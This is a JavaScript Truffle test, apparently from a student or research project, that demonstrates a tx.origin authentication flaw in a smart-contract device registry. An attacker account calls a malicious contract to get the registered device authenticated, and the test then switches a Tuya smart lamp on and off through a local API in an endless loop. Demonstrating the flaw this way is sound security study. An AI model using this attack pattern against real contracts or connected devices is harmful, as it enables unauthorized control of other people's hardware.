const config = require('../../config/dotenvConfig');
const DeviceRegistry = artifacts.require("DeviceRegistry");
const Malicious = artifacts.require("Malicious");
const axios = require('axios');

contract("Malicious", accounts => {
    const owner = accounts[0];
    const attacker = accounts[1];
    const deviceId = config.tuyaDeviceId;
    const apiUrl = 'http://127.0.0.1:5000/tuya/switch';

    async function toggleLight(state) {
        try {
            const response = await axios.post(`${apiUrl}/${state}`);
            console.log('Lâmpada alterada com sucesso:', response.data);
        } catch (error) {
            console.error('Erro ao alterar a lâmpada:', error.message);
        }
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    it("should exploit tx.origin vulnerability", async () => {
        const deviceRegistry = await DeviceRegistry.deployed();
        const malicious = await Malicious.new(deviceRegistry.address);

        // Owner registers a device
        await deviceRegistry.registerDevice(deviceId, owner, { from: owner });

        // Attacker calls the malicious contract, which in turn calls authenticateDevice
        await malicious.attack(deviceId, { from: attacker });

        // Verify if the device is authenticated (should succeed due to tx.origin vulnerability)
        const isAuthenticated = await deviceRegistry.authenticateDevice(deviceId, owner);
        assert.isTrue(isAuthenticated, "The device should be authenticated due to tx.origin vulnerability");

        if (isAuthenticated) {
            while (true) { 
                await toggleLight('true');  
                await delay(1000);  
                await toggleLight('false');  
                await delay(1000); 
            }
        }
    });
});
